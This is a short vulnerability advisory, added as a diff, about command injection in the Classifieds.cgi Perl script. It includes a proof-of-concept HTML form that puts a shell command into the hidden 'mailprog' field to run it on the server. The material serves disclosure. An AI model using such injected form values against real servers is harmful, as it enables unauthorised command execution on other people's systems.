@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/2019/info
+
+Classifieds.cgi is a perl script (part of the classifieds package by Greg Matthews) which provides simple classified ads to web sites. Due to improper input validation it can be used to execute any command on the host machine, with the privileges of the web server. If the attacker can submit a command to run as a hidden variable that command will be executed. Normally this variable is reserved for the mail program and is accessed from an HTML page with the following piece of code: <input type="hidden" name="mailprog" value="/usr/sbin/sendmail"> 
+
+<form method=post action="/cgi-bin/classifieds.cgi">
+<input type="hidden" name="ClassifiedsDir" value="/home/httpd/html/class/ads/">
+<input type="hidden" name="ViewDir" value="http://victim.com/class/ads/">
+<input type="hidden" name="ErrorReturn" value="http://victim.com/class/index.html">
+<input type="hidden" name="ReturnURL" value="http://victim.com/class/hi.html">
+<input type="hidden" name="return" value="duke@viper.net.au">
+<input type="hidden" name="mailprog" value="touch /tmp/bighole">
+<b>Which department do you want your ad to be placed in or you would like to view?
+</form> 
